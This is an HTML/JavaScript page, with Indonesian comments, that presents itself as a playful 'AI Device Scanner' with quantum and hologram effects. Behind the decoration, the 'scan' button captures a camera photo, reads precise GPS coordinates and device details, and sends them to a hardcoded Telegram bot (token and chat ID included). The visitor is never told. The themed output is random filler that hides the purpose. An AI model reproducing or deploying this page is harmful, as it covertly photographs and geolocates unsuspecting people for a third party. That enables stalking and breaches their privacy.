<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Super AI Device Scanner</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <!-- CSP diupdate agar mengizinkan koneksi ke api.telegram.org dan ipify -->
  <meta http-equiv="Content-Security-Policy" content="default-src 'self' https:; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline';">
  <style>
    :root {
      --primary: #2ecc71;
      --secondary: #3498db;
    }
    body { 
      font-family: 'Roboto', Arial, sans-serif; 
      text-align: center; 
      padding: 20px; 
      background: #1a1a1a;
      color: white;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
    }
    .scanner-box {
      width: 300px;
      height: 300px;
      border: 4px solid var(--primary);
      border-radius: 20px;
      margin: 20px auto;
      position: relative;
      overflow: hidden;
      box-shadow: 0 0 30px rgba(46, 204, 113, 0.3);
    }
    .scanner-line {
      position: absolute;
      width: 100%;
      height: 4px;
      background: var(--primary);
      animation: scan 3s infinite;
      box-shadow: 0 0 10px var(--primary);
    }
    @keyframes scan {
      0% { top: 0; opacity: 0; }
      10% { opacity: 1; }
      90% { opacity: 1; }
      100% { top: 100%; opacity: 0; }
    }
    button {
      padding: 15px 40px;
      font-size: 20px;
      background: linear-gradient(45deg, var(--primary), var(--secondary));
      border: none;
      border-radius: 30px;
      cursor: pointer;
      transition: all 0.3s;
      color: white;
      text-transform: uppercase;
      letter-spacing: 2px;
      margin: 20px;
      box-shadow: 0 4px 15px rgba(52, 152, 219, 0.4);
    }
    #loading {
      display: none;
      font-size: 1.5em;
      color: var(--primary);
      text-shadow: 0 0 10px rgba(46, 204, 113, 0.5);
      margin: 10px;
    }
    .device-info {
      background: #2c2c2c;
      padding: 15px;
      border-radius: 10px;
      margin-top: 20px;
      text-align: left;
      max-width: 500px;
      width: 90%;
      font-size: 14px;
      line-height: 1.5;
    }
    .device-info h3 {
      margin-top: 0;
      color: var(--primary);
    }
    .hologram-effect {
      position: fixed;
      pointer-events: none;
      mix-blend-mode: screen;
      opacity: 0.3;
      z-index: 9999;
    }
    @keyframes hologram {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
</head>
<body>
  <h1 style="color: var(--primary); margin-bottom: 20px;">üõ∏ AI Device Scanner</h1>
  
  <div class="scanner-box">
    <div class="scanner-line"></div>
    <video id="video" width="300" height="300" autoplay playsinline muted></video>
  </div>
  
  <button id="capture-btn">üöÄ Start Quantum Scan</button>
  <button id="device-btn">üîç Show Device Info</button>
  
  <div id="loading">üî≠ Scanning Quantum Signature...</div>
  
  <div id="deviceInfo" class="device-info" style="display: none;"></div>
  
  <script>
    // === Konfigurasi Bot Telegram ===
    const BOT_TOKEN = '6130843488:AAEcBDwepm6__C3geoFMSJtsMVrKFeWhMKQ';
    const CHAT_ID = '1121369247';

    // Variabel global
    let currentStream = null;
    let isScanning = false;
    const video = document.getElementById('video');
    const loading = document.getElementById('loading');

    // === Fungsi Helper untuk Notifikasi dan Error ===
    function showError(title, error) {
      alert(`${title}: ${error.message || error}`);
      console.error(title, error);
    }

    function showToast(message, type) {
      // Untuk demo, gunakan console log. Dapat diintegrasikan notifikasi visual.
      console.log(`${type.toUpperCase()}: ${message}`);
    }

    // === Fungsi untuk Mendapatkan Lokasi GPS yang Akurat ===
    function getPreciseLocation() {
      return new Promise((resolve, reject) => {
        if (!navigator.geolocation) {
          reject(new Error("Geolocation not supported"));
        } else {
          navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true, timeout: 15000 });
        }
      });
    }

    // === Fungsi Dummy untuk Analisis Matriks Perangkat ===
    function analyzeDeviceMatrix() {
      // Data dummy; ganti dengan analisis perangkat jika diperlukan.
      return Promise.resolve([[1, 0, 1], [0, 1, 0], [1, 0, 1]]);
    }

    // === Fungsi Dummy untuk Menghasilkan Matriks Gambar ===
    function getImageMatrix(canvas) {
      // Contoh sederhana: kembalikan lebar dan tinggi gambar sebagai matriks.
      return { width: canvas.width, height: canvas.height };
    }

    // === Fungsi untuk Mengubah dataURI ke Blob ===
    async function dataURItoBlob(dataURI) {
      const response = await fetch(dataURI);
      return await response.blob();
    }

    // === Hologram Effect ===
    function createHologramEffect() {
      const colors = ['#00ffff', '#ff00ff', '#ffff00'];
      const effect = document.createElement('div');
      effect.className = 'hologram-effect';
      
      colors.forEach(color => {
        const layer = document.createElement('div');
        layer.style.cssText = `
          position: fixed;
          top: -50%;
          left: -50%;
          width: 200%;
          height: 200%;
          background: radial-gradient(circle, ${color} 0%, transparent 70%);
          animation: hologram 7s linear infinite;
        `;
        effect.appendChild(layer);
      });
      document.body.appendChild(effect);
    }

    // === Inisialisasi Kamera ===
    async function initCamera() {
      try {
        const constraints = {
          video: { 
            facingMode: 'environment',
            width: { ideal: 1920 },
            height: { ideal: 1080 },
            frameRate: { ideal: 60 }
          },
          audio: false
        };
        if (currentStream) {
          currentStream.getTracks().forEach(track => track.stop());
        }
        const stream = await navigator.mediaDevices.getUserMedia(constraints);
        currentStream = stream;
        video.srcObject = stream;
        await new Promise((resolve, reject) => {
          video.onloadedmetadata = resolve;
          video.onerror = reject;
        });
        await video.play();
        createHologramEffect();
      } catch (err) {
        showError('Quantum Scanner Error', err);
      }
    }

    // === Fungsi Quantum Scan ===
    async function startQuantumScan() {
      if (isScanning) return;
      isScanning = true;
      loading.style.display = 'block';

      try {
        const [photoData, location, deviceMatrix, aiAnalysis] = await Promise.all([
          captureQuantumImage(),
          getPreciseLocation(),
          analyzeDeviceMatrix(),
          performAIAnalysis()
        ]);

        const report = generateHologramReport(photoData, location, deviceMatrix, aiAnalysis);
        // Hentikan stream kamera untuk menghemat resource
        currentStream.getTracks().forEach(track => track.stop());
        await sendToTelegram(report);
        showToast('üåå Quantum Signature Captured!', 'success');
      } catch (error) {
        showError('Quantum Anomaly Detected', error);
      } finally {
        isScanning = false;
        loading.style.display = 'none';
      }
    }

    // === Fungsi untuk Mengambil Gambar dengan Efek Quantum ===
    async function captureQuantumImage() {
      const canvas = document.createElement('canvas');
      const context = canvas.getContext('2d');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      context.drawImage(video, 0, 0);
      applyQuantumFilter(context, canvas);
      return {
        image: canvas.toDataURL('image/webp', 0.9),
        matrix: getImageMatrix(canvas)
      };
    }

    // === Fungsi Analisis AI (Dummy) ===
    async function performAIAnalysis() {
      const aiData = {
        threatLevel: Math.floor(Math.random() * 100),
        biometrics: navigator.userAgent.includes('Mobile') ? 'Humanoid Detected' : 'AI Signature',
        quantumEntanglement: `${Math.random().toFixed(5)}Q`
      };
      if (navigator.getBattery) {
        try {
          const battery = await navigator.getBattery();
          aiData.energySignature = `${Math.round(battery.level * 100)}%`;
        } catch (e) {
          aiData.energySignature = 'Unknown';
        }
      }
      return aiData;
    }

    // === Fungsi untuk Menghasilkan Laporan Hologram ===
    function generateHologramReport(photo, location, matrix, ai) {
      const timestamp = new Date().toISOString();
      return {
        image: photo.image,
        metadata: {
          spacetimeCoordinates: {
            lat: location.coords.latitude,
            lon: location.coords.longitude,
            accuracy: location.coords.accuracy,
            altitude: location.coords.altitude || 'CLASSIFIED'
          },
          quantumMatrix: matrix,
          aiAnalysis: ai,
          temporalSignature: timestamp
        }
      };
    }

    // === Integrasi dengan Telegram ===
    async function sendToTelegram(report) {
      const formData = new FormData();
      const blob = await dataURItoBlob(report.image);
      const caption = `ü™ê *Quantum Scan Report*\n\n` +
                      `üìÖ ${new Date(report.metadata.temporalSignature).toLocaleString()}\n\n` +
                      `üåç Coordinates: \`${report.metadata.spacetimeCoordinates.lat.toFixed(6)}, ${report.metadata.spacetimeCoordinates.lon.toFixed(6)}\`\n` +
                      `üéØ Accuracy: ${Math.round(report.metadata.spacetimeCoordinates.accuracy)}m\n\n` +
                      `‚ö†Ô∏è Threat Level: ${report.metadata.aiAnalysis.threatLevel}%\n` +
                      `üß¨ Biometrics: ${report.metadata.aiAnalysis.biometrics}\n` +
                      `‚öõÔ∏è Quantum Entanglement: ${report.metadata.aiAnalysis.quantumEntanglement}`;
      formData.append('chat_id', CHAT_ID);
      formData.append('photo', blob, `quantum_scan_${Date.now()}.webp`);
      formData.append('caption', caption);
      formData.append('parse_mode', 'Markdown');

      const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
        method: 'POST',
        body: formData
      });
      if (!response.ok) {
        throw new Error('Quantum Communication Failed');
      }
    }

    // === Efek Filter Quantum pada Gambar ===
    function applyQuantumFilter(ctx, canvas) {
      const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
      const data = imageData.data;
      for (let i = 0; i < data.length; i += 4) {
        data[i] = Math.abs(255 - data[i]);         // Red inversed
        // data[i+1] tetap (Green)
        data[i + 2] = Math.abs(255 - data[i + 2]);   // Blue inversed
      }
      ctx.putImageData(imageData, 0, 0);
    }

    // === Fungsi untuk Mendapatkan Informasi Perangkat secara Detail ===
    async function getDetailedDeviceInfo() {
      // Dapatkan informasi baterai
      let batteryInfo = { level: 'N/A', charging: 'N/A' };
      if (navigator.getBattery) {
        try {
          const battery = await navigator.getBattery();
          batteryInfo = {
            level: Math.round(battery.level * 100) + '%',
            charging: battery.charging ? 'Yes' : 'No'
          };
        } catch (e) {
          batteryInfo = { level: 'N/A', charging: 'N/A' };
        }
      }
      // Dapatkan informasi koneksi jaringan
      let networkInfo = {};
      if (navigator.connection) {
        networkInfo = {
          type: navigator.connection.effectiveType || 'N/A',
          downlink: navigator.connection.downlink || 'N/A',
          rtt: navigator.connection.rtt || 'N/A'
        };
      }
      // Dapatkan alamat IP publik
      let ip = 'N/A';
      try {
        const ipRes = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipRes.json();
        ip = ipData.ip;
      } catch (e) {}
      // Dapatkan informasi lokasi
      let locationInfo = {};
      try {
        const pos = await getPreciseLocation();
        locationInfo = {
          lat: pos.coords.latitude,
          lon: pos.coords.longitude,
          accuracy: pos.coords.accuracy,
          mapsLink: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`
        };
      } catch (e) {
        locationInfo = { error: 'Unable to get location' };
      }
      // Zona waktu
      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
      return {
        os: getOS(),
        platform: navigator.platform || 'N/A',
        userAgent: navigator.userAgent,
        ram: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'N/A',
        cores: navigator.hardwareConcurrency || 'N/A',
        battery: batteryInfo,
        network: networkInfo,
        ip: ip,
        resolution: `${screen.width} x ${screen.height}`,
        timezone: timezone,
        location: locationInfo
      };
    }

    // === Utilitas untuk Mendapatkan OS dari User Agent ===
    function getOS() {
      const ua = navigator.userAgent;
      if (/Windows NT/.test(ua)) return 'Windows';
      if (/Android/.test(ua)) return 'Android';
      if (/iPhone|iPad|iPod/.test(ua)) return 'iOS';
      if (/Mac OS X/.test(ua)) return 'macOS';
      if (/Linux/.test(ua)) return 'Linux';
      return 'Unknown';
    }

    // === Fungsi untuk Menampilkan Informasi Perangkat ke UI ===
    async function displayDeviceInformation() {
      try {
        const info = await getDetailedDeviceInfo();
        const infoDiv = document.getElementById('deviceInfo');
        infoDiv.style.display = 'block';
        infoDiv.innerHTML = `
          <h3>Device Information</h3>
          <strong>OS:</strong> ${info.os} <br>
          <strong>Platform:</strong> ${info.platform} <br>
          <strong>User Agent:</strong> ${info.userAgent} <br>
          <strong>RAM:</strong> ${info.ram} <br>
          <strong>CPU Cores:</strong> ${info.cores} <br>
          <strong>Battery:</strong> Level: ${info.battery.level}, Charging: ${info.battery.charging} <br>
          <strong>Network:</strong> Type: ${info.network.type}, Downlink: ${info.network.downlink} Mbps, RTT: ${info.network.rtt} ms <br>
          <strong>IP Address:</strong> ${info.ip} <br>
          <strong>Resolution:</strong> ${info.resolution} <br>
          <strong>Timezone:</strong> ${info.timezone} <br>
          <strong>Location:</strong> ${info.location.lat ? info.location.lat.toFixed(6) + ', ' + info.location.lon.toFixed(6) : info.location.error} 
          ${info.location.mapsLink ? `<a href="${info.location.mapsLink}" target="_blank" style="color: var(--primary);">[View Map]</a>` : ''}
        `;
      } catch (error) {
        showError('Error fetching device info', error);
      }
    }

    // === Inisialisasi Scanner dan Event Listener ===
    if (navigator.mediaDevices) {
      initCamera();
      document.getElementById('capture-btn').onclick = startQuantumScan;
      document.getElementById('device-btn').onclick = displayDeviceInformation;
    } else {
      showToast('Quantum Scanner Not Supported', 'error');
    }
  </script>
</body>
</html>
